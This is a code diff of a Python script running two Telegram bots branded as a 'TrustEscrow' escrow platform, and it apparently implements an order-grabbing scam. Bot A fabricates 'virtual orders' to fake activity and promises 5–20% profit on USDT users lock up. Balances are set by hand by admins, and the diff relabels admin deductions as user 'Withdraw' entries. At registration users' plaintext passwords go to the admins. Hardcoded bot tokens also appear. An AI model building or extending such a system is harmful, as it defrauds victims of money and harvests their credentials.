@@ -9,7 +9,7 @@ import os
 from flask import Flask
 from datetime import datetime
 
-# ======================== 机器人TOKEN（已按你要求填好，完全不变）========================
+# ======================== 机器人TOKEN（完全不变）========================
 BOT1_TOKEN = "8716451687:AAGXoF5wuwuroCJ23w5UzaueXCUyy5p67q0"
 BOT2_TOKEN = "8279854167:AAHLrvg-i6e0M_WeG8coIljYlGg_RF8_oRM"
 
@@ -31,7 +31,7 @@ def run_flask():
         pass
 
 # ==============================================================================
-# ================================= 机器人A（优化版，仅加时间）===================================
+# ================================= 机器人A（最终优化版）===================================
 # ==============================================================================
 ADMIN_IDS_A = [8781082053, 8256055083]
 VIRTUAL_ORDER_REFRESH_SECONDS_A = 120
@@ -49,6 +49,10 @@ user_flow1 = {}
 user_banned1 = {}
 virtual_orders1 = []
 
+# 清理记录：每6天清理已完成+已取消订单
+last_clean_time = time.time()
+CLEAN_INTERVAL = 6 * 24 * 60 * 60
+
 # ======================== 核心优化：3小时密码有效期（完全不变）========================
 user_pwd_verify_time = {}
 PASSWORD_VALID_SECONDS = 3 * 60 * 60
@@ -62,7 +66,25 @@ def is_pwd_verified(user_id):
 def set_pwd_verified(user_id):
     user_pwd_verify_time[user_id] = time.time()
 
-# ======================== 多语言包（仅补全时间字段，其他完全不变）========================
+# ======================== 自动清理：每6天清理已完成+已取消订单 ========================
+def auto_clean_orders():
+    global last_clean_time
+    while True:
+        try:
+            now = time.time()
+            if now - last_clean_time >= CLEAN_INTERVAL:
+                to_del = []
+                for oid, o in orders1.items():
+                    if o["status"] in (2, 3):
+                        to_del.append(oid)
+                for oid in to_del:
+                    orders1.pop(oid, None)
+                last_clean_time = now
+        except:
+            pass
+        time.sleep(600)
+
+# ======================== 多语言包（最终完美版：无混显）========================
 TEXT_A = {
     "zh": {
         "home": """🏆 TrustEscrow 頂級擔保平台
@@ -87,8 +109,12 @@ TEXT_A = {
 🆔 用戶ID：{}
 💰 餘額：{:.2f} USDT
 📌 狀態：{}
-⏳ 未完成訂單： {}
-✅ 已完成訂單： {}""",
+
+⏳ 進行中訂單
+{}
+
+✅ 已完成訂單
+{}""",
         "grab": """🚀 搶單大廳（每2分鐘自動刷新）
 點擊按鈕直接搶單：
 {}""",
@@ -97,19 +123,30 @@ TEXT_A = {
         "deposit": """💰 儲值 & 提現
 請聯繫官方客服：
 ➡️ @fcff88""",
-        "record": """📜 擔保記錄
+        "record": """📜 擔保歷史
+
+⏳ 進行中
+{}
+
+✅ 已完成
+{}
+
+❌ 已取消
 {}""",
         "account_detail": """📋 資金明細
 🆔 用戶ID：{}
 💰 當前餘額：{:.2f} USDT
 
-💵 儲蓄
+💵 充值記錄
 {}
 
-📈 收益
+📈 收益記錄
 {}
 
-🔒 擔保
+🔒 擔保凍結
+{}
+
+💳 提現記錄
 {}
 """,
         "status_wait": "待接單",
@@ -143,8 +180,8 @@ TEXT_A = {
 📈 預計利潤：+{:.2f} USDT
 📅 創建時間：{}""",
         "flow_escrow_lock": "擔保凍結",
-        "flow_admin_add": "管理員充值",
-        "flow_admin_sub": "管理員扣除",
+        "flow_deposit": "充值",
+        "flow_withdraw": "提現",
         "flow_profit": "訂單#{} 收益",
         "flow_refund": "訂單#{} 退款"
     },
@@ -170,8 +207,12 @@ Fill in your real info:
 🆔 ID: {}
 💰 Balance: {:.2f} USDT
 📌 Status: {}
-⏳ Pending Orders: {}
-✅ Completed Orders: {}""",
+
+⏳ Pending Orders
+{}
+
+✅ Completed Orders
+{}""",
         "grab": """🚀 Grab Hall (Auto-refresh every 2min)
 Click button to grab order:
 {}""",
@@ -179,19 +220,30 @@ Click button to grab order:
         "grab_already_gone": "❌ Order Already Taken",
         "deposit": """💰 Deposit & Withdraw
 Contact support: @fcff88""",
-        "record": """📜 Escrow Record
+        "record": """📜 Escrow History
+
+⏳ Pending
+{}
+
+✅ Completed
+{}
+
+❌ Canceled
 {}""",
         "account_detail": """📋 Account Detail
 🆔 User ID: {}
 💰 Balance: {:.2f} USDT
 
-💵 Savings
+💵 Deposit
 {}
 
 📈 Profit
 {}
 
-🔒 Escrow
+🔒 Escrow Lock
+{}
+
+💳 Withdraw
 {}
 """,
         "status_wait": "Pending",
@@ -224,18 +276,30 @@ Contact support: @fcff88""",
 💰 Amount: {:.2f} USDT
 📈 Profit: +{:.2f} USDT
 📅 Created: {}""",
-        "flow_escrow_lock": "Escrow Locked",
-        "flow_admin_add": "Admin Deposit",
-        "flow_admin_sub": "Admin Deduct",
+        "flow_escrow_lock": "Escrow Lock",
+        "flow_deposit": "Deposit",
+        "flow_withdraw": "Withdraw",
         "flow_profit": "Order#{} Profit",
         "flow_refund": "Order#{} Refund"
     }
 }
 
-# 订单类型中英文映射（完全不变）
+# 订单类型中英文映射
 type_map = {
-    "zh": {"遊戲交易": "遊戲交易", "購物": "購物", "充值": "充值", "代練": "代練", "跨境交易":"跨境交易"},
-    "en": {"遊戲交易": "Game", "購物": "Shopping", "充值": "TopUp", "代練": "Boost", "跨境交易":"Cross-border"}
+    "zh": {
+        "遊戲交易": "遊戲交易",
+        "購物": "購物",
+        "充值": "充值",
+        "代練": "代練",
+        "跨境交易": "跨境交易"
+    },
+    "en": {
+        "遊戲交易": "Game",
+        "購物": "Shopping",
+        "充值": "TopUp",
+        "代練": "Boost",
+        "跨境交易": "Cross-border"
+    }
 }
 
 # ======================== 虚拟订单刷新（完全不变）========================
@@ -321,7 +385,7 @@ def start_a(msg):
 # ======================== 密码等待状态记录（完全不变）========================
 user_waiting_pwd = {}
 
-# ======================== 回调处理（仅加时间，逻辑完全不变）========================
+# ======================== 回调处理（仅优化排版+语言+时间）========================
 @bot1.callback_query_handler(func=lambda c: True)
 def callback_a(c):
     try:
@@ -340,7 +404,7 @@ def callback_a(c):
             bot1.answer_callback_query(c.id)
             return
 
-        # 一键补接单（加时间）
+        # 一键补接单
         if c.data == "re_acc_all":
             if not is_pwd_verified(u):
                 user_waiting_pwd[u] = {"action": "re_acc_all"}
@@ -359,7 +423,8 @@ def callback_a(c):
             for oid in target_orders:
                 o = orders1[oid]
                 user_balance1[u] -= o["amount"]
-                user_flow1[u].append(f"-{o['amount']:.2f} USDT {t['flow_escrow_lock']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+                time_str = datetime.now().strftime("%m-%d %H:%M")
+                user_flow1[u].append(f"-{o['amount']:.2f} USDT {t['flow_escrow_lock']} {time_str}")
                 o["status"] = 1
             bot1.answer_callback_query(c.id, f"✅ 已補接{len(target_orders)}筆" if lang=="zh" else f"✅ Accepted {len(target_orders)}", show_alert=True)
             bot1.edit_message_text(t["home"], cid, mid, reply_markup=main_menu1(u))
@@ -385,54 +450,59 @@ def callback_a(c):
             bal = user_balance1.get(u, 0.0)
             flows = user_flow1.get(u, [])
 
-            savings_lines = []
+            deposit_lines = []
             profit_lines = []
             escrow_lines = []
+            withdraw_lines = []
 
-            for line in flows[-15:]:
-                lower = line.lower()
-                if "充值" in line or "儲值" in line or "Deposit" in line or "admin_add" in lower:
-                    savings_lines.append(line)
-                elif "收益" in line or "profit" in lower:
+            for line in flows[-20:]:
+                if t["flow_deposit"] in line:
+                    deposit_lines.append(line)
+                elif t["flow_withdraw"] in line:
+                    withdraw_lines.append(line)
+                elif t["flow_profit"].split("#")[0] in line or "Profit" in line:
                     profit_lines.append(line)
-                elif "擔保" in line or "escrow" in lower:
+                elif t["flow_escrow_lock"] in line:
                     escrow_lines.append(line)
 
-            savings_text = "\n".join(savings_lines) if savings_lines else ("—" if lang=="zh" else "—")
-            profit_text = "\n".join(profit_lines) if profit_lines else ("—" if lang=="zh" else "—")
-            escrow_text = "\n".join(escrow_lines) if escrow_lines else ("—" if lang=="zh" else "—")
+            def join_lines(lst):
+                return "\n".join(lst) if lst else "—"
 
-            text = t["account_detail"].format(u, bal, savings_text, profit_text, escrow_text)
+            text = t["account_detail"].format(
+                u, bal,
+                join_lines(deposit_lines),
+                join_lines(profit_lines),
+                join_lines(escrow_lines),
+                join_lines(withdraw_lines)
+            )
             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
 
         elif c.data == "profile":
-            pending = []
-            completed = []
+            pending_lines = []
+            completed_lines = []
             for oid, o in orders1.items():
                 if o["user"] == u:
                     typ = o.get("type_name", "-")
                     typ = type_map[lang].get(typ, typ)
                     s_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                     s = s_map.get(o["status"], t["status_wait"])
-                    create_time = o.get("create_time", datetime.now().strftime("%Y-%m-%d %H:%M"))
-                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}\n   📅 {create_time}"
+                    time_str = o.get("create_time", datetime.now().strftime("%m-%d %H:%M"))
+                    line = f"• #{oid} {typ} {o['amount']:.2f} USDT | {s} | {time_str}"
                     if o["status"] == 2:
-                        completed.append(line)
+                        completed_lines.append(line)
                     else:
-                        pending.append((line, oid, o["status"]))
+                        pending_lines.append(line)
+
             v = user_verify1.get(u, 0)
             status_map = {
                 "zh": {0: "未申請", 1: "審核中", 2: "已通過"},
                 "en": {0: "Not Applied", 1: "Pending", 2: "Verified"}
             }
             status = status_map[lang][v]
-            p_lines = []
-            for line, oid, sta in pending:
-                p_lines.append(line)
-                if sta == 0:
-                    p_lines.append(f"   👉 [{t['btn_re_accept']}](callback:re_acc_{oid})")
-            p_text = "\n".join(p_lines) if p_lines else ("無" if lang == "zh" else "None")
-            c_text = "\n".join(completed) if completed else ("無" if lang == "zh" else "None")
+
+            p_text = "\n".join(pending_lines) if pending_lines else ("無" if lang == "zh" else "None")
+            c_text = "\n".join(completed_lines) if completed_lines else ("無" if lang == "zh" else "None")
+
             text = t["profile"].format(u, user_balance1.get(u, 0), status, p_text, c_text)
             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
 
@@ -465,22 +535,20 @@ def callback_a(c):
             global order_id1
             oid = order_id1
             order_id1 += 1
-            create_time = datetime.now().strftime("%Y-%m-%d %H:%M")
+            time_str = datetime.now().strftime("%m-%d %H:%M")
             orders1[oid] = {
                 "user": u,
                 "amount": hit["amount"],
                 "type": "grab",
                 "type_name": hit.get("type_name", "-"),
                 "status": 0,
-                "create_time": create_time
+                "create_time": time_str
             }
             profit = round(hit["amount"] * 0.05, 2)
             tn = hit.get("type_name", "-")
             tn = type_map[lang].get(tn, tn)
-            if lang == "zh":
-                s = f"✅ 搶單成功 #{oid}\n類型：{tn}\n本金：{hit['amount']} USDT\n利潤：+{profit} USDT\n📅 {create_time}"
-            else:
-                s = f"✅ Order Grabbed #{oid}\nType: {tn}\nAmount: {hit['amount']} USDT\nProfit: +{profit} USDT\n📅 {create_time}"
+            s = f"✅ 搶單成功 #{oid}\n類型：{tn}\n本金：{hit['amount']} USDT\n利潤：+{profit} USDT\n📅 {time_str}" if lang == "zh" else \
+                f"✅ Order Grabbed #{oid}\nType: {tn}\nAmount: {hit['amount']} USDT\nProfit: +{profit} USDT\n📅 {time_str}"
             bot1.edit_message_text(s, cid, mid, reply_markup=accept_btn1(oid, u))
 
         elif c.data.startswith("acc_"):
@@ -504,12 +572,12 @@ def callback_a(c):
 
             amount = o["amount"]
             user_balance1[u] -= amount
-            create_time = o.get("create_time", datetime.now().strftime("%Y-%m-%d %H:%M"))
-            user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+            time_str = datetime.now().strftime("%m-%d %H:%M")
+            user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} {time_str}")
             o["status"] = 1
             tn = o.get("type_name", "-")
             show_tn = type_map[lang].get(tn, tn)
-            text = t["accept_success"].format(oid, show_tn, amount, create_time, t["status_doing"])
+            text = t["accept_success"].format(oid, show_tn, amount, o.get("create_time", time_str), t["status_doing"])
             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
 
         elif c.data.startswith("re_acc_"):
@@ -533,38 +601,48 @@ def callback_a(c):
 
             amount = o["amount"]
             user_balance1[u] -= amount
-            create_time = o.get("create_time", datetime.now().strftime("%Y-%m-%d %H:%M"))
-            user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+            time_str = datetime.now().strftime("%m-%d %H:%M")
+            user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} {time_str}")
             o["status"] = 1
             tn = o.get("type_name", "-")
             show_tn = type_map[lang].get(tn, tn)
-            text = t["accept_success"].format(oid, show_tn, amount, create_time, t["status_doing"])
+            text = t["accept_success"].format(oid, show_tn, amount, o.get("create_time", time_str), t["status_doing"])
             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
 
         elif c.data == "deposit":
             bot1.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu1(u))
 
         elif c.data == "record":
-            lines = []
+            pending = []
+            completed = []
+            canceled = []
             for oid, o in orders1.items():
                 if o["user"] == u:
                     s_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                     s = s_map.get(o["status"], t["status_wait"])
                     typ = o.get("type_name", "-")
                     typ = type_map[lang].get(typ, typ)
-                    create_time = o.get("create_time", datetime.now().strftime("%Y-%m-%d %H:%M"))
-                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}\n   📅 {create_time}"
-                    if o["status"] == 0:
-                        line += f" [{t['btn_re_accept']}](callback:re_acc_{oid})"
-                    lines.append(line)
-            text = t["record"].format("\n".join(lines) if lines else ("無記錄" if lang == "zh" else "No Records"))
+                    time_str = o.get("create_time", datetime.now().strftime("%m-%d %H:%M"))
+                    line = f"• #{oid} {typ} {o['amount']:.2f} USDT | {s} | {time_str}"
+                    if o["status"] in (0, 1):
+                        pending.append(line)
+                    elif o["status"] == 2:
+                        completed.append(line)
+                    elif o["status"] == 3:
+                        canceled.append(line)
+
+            text = t["record"].format(
+                "\n".join(pending) if pending else "—",
+                "\n".join(completed) if completed else "—",
+                "\n".join(canceled) if canceled else "—"
+            )
             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
 
         bot1.answer_callback_query(c.id)
     except Exception as e:
         pass
 
-# ======================== 用户消息处理（仅加时间，逻辑完全不变）========================
+# ======================== 用户消息处理（完全不变）========================
 @bot1.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS_A)
 def user_input_a(msg):
     try:
@@ -596,7 +674,7 @@ def user_input_a(msg):
                 }
                 user_verify1[u] = 1
                 user_applying1[u] = False
-                notify_admins1(f"📥 新入駐申請\n用戶ID：{u}\n姓名：{name}\n郵箱：{email}\n密碼：{pwd}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}")
+                notify_admins1(f"📥 新入駐申請\n用戶ID：{u}\n姓名：{name}\n郵箱：{email}\n密碼：{pwd}")
                 mid = last_msg1.get(u)
                 if mid:
                     bot1.edit_message_text(t["reg_success"], cid, mid, reply_markup=main_menu1(u))
@@ -624,13 +702,13 @@ def user_input_a(msg):
                     o = orders1.get(oid)
                     if o and o["user"] == u and o["status"] == 0 and user_balance1.get(u,0) >= o["amount"]:
                         amount = o["amount"]
-                        create_time = o.get("create_time", datetime.now().strftime("%Y-%m-%d %H:%M"))
+                        time_str = datetime.now().strftime("%m-%d %H:%M")
                         user_balance1[u] -= amount
-                        user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+                        user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} {time_str}")
                         o["status"] = 1
                         tn = o.get("type_name","-")
                         stn = type_map[lang].get(tn,tn)
-                        text = t["accept_success"].format(oid, stn, amount, create_time, t["status_doing"])
+                        text = t["accept_success"].format(oid, stn, amount, o.get("create_time", time_str), t["status_doing"])
                         mid = last_msg1.get(u)
                         if mid:
                             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
@@ -639,13 +717,13 @@ def user_input_a(msg):
                     o = orders1.get(oid)
                     if o and o["user"] == u and o["status"] == 0 and user_balance1.get(u,0) >= o["amount"]:
                         amount = o["amount"]
-                        create_time = o.get("create_time", datetime.now().strftime("%Y-%m-%d %H:%M"))
+                        time_str = datetime.now().strftime("%m-%d %H:%M")
                         user_balance1[u] -= amount
-                        user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+                        user_flow1[u].append(f"-{amount:.2f} USDT {t['flow_escrow_lock']} {time_str}")
                         o["status"] = 1
                         tn = o.get("type_name","-")
                         stn = type_map[lang].get(tn,tn)
-                        text = t["accept_success"].format(oid, stn, amount, create_time, t["status_doing"])
+                        text = t["accept_success"].format(oid, stn, amount, o.get("create_time", time_str), t["status_doing"])
                         mid = last_msg1.get(u)
                         if mid:
                             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
@@ -656,7 +734,8 @@ def user_input_a(msg):
                         for oid in target_orders:
                             o = orders1[oid]
                             user_balance1[u] -= o["amount"]
-                            user_flow1[u].append(f"-{o['amount']:.2f} USDT {t['flow_escrow_lock']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+                            time_str = datetime.now().strftime("%m-%d %H:%M")
+                            user_flow1[u].append(f"-{o['amount']:.2f} USDT {t['flow_escrow_lock']} {time_str}")
                             o["status"] = 1
                         mid = last_msg1.get(u)
                         if mid:
@@ -668,7 +747,7 @@ def user_input_a(msg):
     except:
         pass
 
-# ======================== 管理员命令处理（仅加时间，逻辑完全不变）========================
+# ======================== 管理员命令（管理员查ID也归类排版）========================
 @bot1.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS_A)
 def admin_cmd_a(msg):
     try:
@@ -684,6 +763,7 @@ def admin_cmd_a(msg):
             bot1.send_message(u, f"✅ 已通過用戶 {target}")
             return
 
+        # 管理员查ID：订单归类排版
         if len(arr) >= 2 and arr[0] == "查ID":
             target = int(arr[1])
             info = user_info1.get(target, {})
@@ -691,15 +771,31 @@ def admin_cmd_a(msg):
             pwd = info.get("pwd", "未設置")
             name = info.get("name", "-")
             email = info.get("email", "-")
-            text = f"📋 用戶 {target}\n姓名：{name}\n郵箱：{email}\n密碼：{pwd}\n💰 餘額：{bal:.2f}\n"
-            os_list = [o for o in orders1.items() if o[1]["user"] == target]
-            for oid, o in os_list:
-                typ = o.get("type_name", "-")
-                typ = type_map["zh"].get(typ, typ)
-                sta = {0: "待接單", 1: "已接單", 2: "已完成", 3: "已取消"}.get(o["status"], "?")
-                profit = round(o["amount"] * (0.05 if o["type"] == "grab" else random.uniform(0.15, 0.2)), 2)
-                create_time = o.get("create_time", datetime.now().strftime("%Y-%m-%d %H:%M"))
-                text += f"#{oid} {typ} {o['amount']} +{profit} | {sta} 📅 {create_time}\n"
+
+            pending = []
+            completed = []
+            canceled = []
+
+            for oid, o in orders1.items():
+                if o["user"] == target:
+                    typ = o.get("type_name", "-")
+                    typ = type_map["zh"].get(typ, typ)
+                    sta_map = {0: "待接單", 1: "已接單", 2: "已完成", 3: "已取消"}
+                    sta = sta_map.get(o["status"], "?")
+                    profit = round(o["amount"] * (0.05 if o["type"] == "grab" else random.uniform(0.15, 0.2)), 2)
+                    time_str = o.get("create_time", datetime.now().strftime("%m-%d %H:%M"))
+                    line = f"#{oid} {typ} {o['amount']:.2f} +{profit} | {sta} | {time_str}"
+                    if o["status"] in (0, 1):
+                        pending.append(line)
+                    elif o["status"] == 2:
+                        completed.append(line)
+                    elif o["status"] == 3:
+                        canceled.append(line)
+
+            text = f"📋 用戶 {target}\n姓名：{name}\n郵箱：{email}\n密碼：{pwd}\n💰 餘額：{bal:.2f}\n\n"
+            text += "⏳ 進行中\n" + "\n".join(pending) + "\n\n" if pending else ""
+            text += "✅ 已完成\n" + "\n".join(completed) + "\n\n" if completed else ""
+            text += "❌ 已取消\n" + "\n".join(canceled) if canceled else ""
             bot1.send_message(u, text)
             return
 
@@ -708,7 +804,8 @@ def admin_cmd_a(msg):
             uid = int(uid)
             amt = float(amt)
             user_balance1[uid] = user_balance1.get(uid, 0.0) + amt
-            user_flow1.setdefault(uid, []).append(f"+{amt:.2f} {t['flow_admin_add']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+            time_str = datetime.now().strftime("%m-%d %H:%M")
+            user_flow1.setdefault(uid, []).append(f"+{amt:.2f} USDT {TEXT_A[user_lang1.get(uid,'zh')]['flow_deposit']} {time_str}")
             bot1.send_message(u, f"✅ +{amt} → {uid}")
             return
 
@@ -717,7 +814,8 @@ def admin_cmd_a(msg):
             uid = int(uid)
             amt = float(amt)
             user_balance1[uid] = max(0.0, user_balance1.get(uid, 0.0) - amt)
-            user_flow1.setdefault(uid, []).append(f"-{amt:.2f} {t['flow_admin_sub']} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+            time_str = datetime.now().strftime("%m-%d %H:%M")
+            user_flow1.setdefault(uid, []).append(f"-{amt:.2f} USDT {TEXT_A[user_lang1.get(uid,'zh')]['flow_withdraw']} {time_str}")
             bot1.send_message(u, f"✅ -{amt} → {uid}")
             return
 
@@ -728,20 +826,20 @@ def admin_cmd_a(msg):
             global order_id1
             oid = order_id1
             order_id1 += 1
-            create_time = datetime.now().strftime("%Y-%m-%d %H:%M")
+            time_str = datetime.now().strftime("%m-%d %H:%M")
             orders1[oid] = {
                 "user": target,
                 "amount": amt,
                 "type": "assign",
                 "type_name": typename,
                 "status": 0,
-                "create_time": create_time
+                "create_time": time_str
             }
             profit = round(amt * random.uniform(0.15, 0.2), 2)
             bot1.send_message(u, f"✅ 派單 #{oid} → {target}")
             lang_t = user_lang1.get(target, "zh")
             t_a = TEXT_A[lang_t]
-            s = t_a["new_order_assign"].format(oid, typename, amt, profit, create_time)
+            s = t_a["new_order_assign"].format(oid, typename, amt, profit, time_str)
             bot1.send_message(target, s, reply_markup=accept_btn1(oid, target))
             return
 
@@ -754,7 +852,8 @@ def admin_cmd_a(msg):
             o["status"] = 2
             profit = o["amount"] * (random.uniform(0.15, 0.2) if o["type"] == "assign" else 0.05)
             user_balance1[o["user"]] += o["amount"] + profit
-            user_flow1.setdefault(o["user"], []).append(f"+{profit:.2f} {t['flow_profit'].format(oid)} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+            time_str = datetime.now().strftime("%m-%d %H:%M")
+            user_flow1.setdefault(o["user"], []).append(f"+{profit:.2f} USDT {TEXT_A[user_lang1.get(o['user'],'zh')]['flow_profit'].format(oid)} {time_str}")
             bot1.send_message(u, f"✅ 訂單 #{oid} 完成")
             return
 
@@ -766,7 +865,8 @@ def admin_cmd_a(msg):
                 return
             if o["status"] == 1:
                 user_balance1[o["user"]] += o["amount"]
-                user_flow1.setdefault(o["user"], []).append(f"+{o['amount']:.2f} {t['flow_refund'].format(oid)} [{datetime.now().strftime('%Y-%m-%d %H:%M')}]")
+                time_str = datetime.now().strftime("%m-%d %H:%M")
+                user_flow1.setdefault(o["user"], []).append(f"+{o['amount']:.2f} USDT {TEXT_A[user_lang1.get(o['user'],'zh')]['flow_refund'].format(oid)} {time_str}")
             o["status"] = 3
             bot1.send_message(u, f"✅ 訂單 #{oid} 已取消")
             return
@@ -786,7 +886,7 @@ def admin_cmd_a(msg):
         pass
 
 # ==============================================================================
-# ================================= 机器人B（完整无截断，仅加时间）=============================
+# ================================= 机器人B（完整无截断）=============================
 # ==============================================================================
 ADMIN_ID_B = 8401979801
 user_lang2 = {}
@@ -1057,7 +1157,7 @@ def msg_b(msg):
             code = txt.strip()
             if user_balance2.get(u, 0) >= amt:
                 user_balance2[u] -= amt
-                create_time = datetime.now().strftime("%Y-%m-%d %H:%M")
+                create_time = datetime.now().strftime("%m-%d %H:%M")
                 orders2[code] = {"buyer": u, "amount": amt, "time": create_time}
                 bot2.send_message(cid, t["escrow_success"].format(amt, code, create_time), reply_markup=main_menu2(u))
                 user_step2[u] = None
@@ -1073,7 +1173,7 @@ def msg_b(msg):
                 user_step2[u] = None
                 return
             o = orders2[code]
-            pair_time = datetime.now().strftime("%Y-%m-%d %H:%M")
+            pair_time = datetime.now().strftime("%m-%d %H:%M")
             bot2.send_message(cid, t["pair_success"].format(o["buyer"], u, o["amount"], pair_time), reply_markup=main_menu2(u))
             try:
                 bot2.send_message(ADMIN_ID_B, f"📥 新訂單\n口令：{code}\n買方：{o['buyer']}\n賣方：{u}\n金額：{o['amount']} USDT\n📅 {pair_time}")
@@ -1105,6 +1205,7 @@ def run_bot2():
 if __name__ == "__main__":
     threading.Thread(target=run_flask, daemon=True).start()
     threading.Thread(target=refresh_virtual_orders1, daemon=True).start()
+    threading.Thread(target=auto_clean_orders, daemon=True).start()
     threading.Thread(target=run_bot1, daemon=True).start()
     threading.Thread(target=run_bot2, daemon=True).start()
     while True:
